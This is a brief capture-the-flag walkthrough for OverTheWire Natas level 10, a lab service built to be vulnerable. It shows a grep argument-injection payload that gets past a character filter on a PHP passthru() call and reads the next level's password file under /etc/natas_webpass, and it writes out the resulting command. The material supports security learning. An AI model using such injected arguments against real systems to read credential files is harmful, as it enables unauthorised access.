# Level 10

URL : http://natas10.natas.labs.overthewire.org

## Solution

This is the same challenge as Level 9, only this time, it says:

>  For security reasons, we now filter on certain characters


one way to do this would be to use `grep` features and options.

We will be using **`-E`** option for regular expression matching:

we know that all passwords till now match this expression : [A-Za-z0-9]+

so our payload will be : **`-E "[a-zA-Z0-9]+" /etc/natas_webpass/natas11`**

So, the final command to be passed to passthru() would look like this: 

**grep -i -E "[a-zA-Z0-9]+" /etc/natas_webpass/natas11 dictionary.txt**



Thats all ! 
Btw, GREP stands for `Global regular expression print`

GREP IS A SO AWESOME ! 
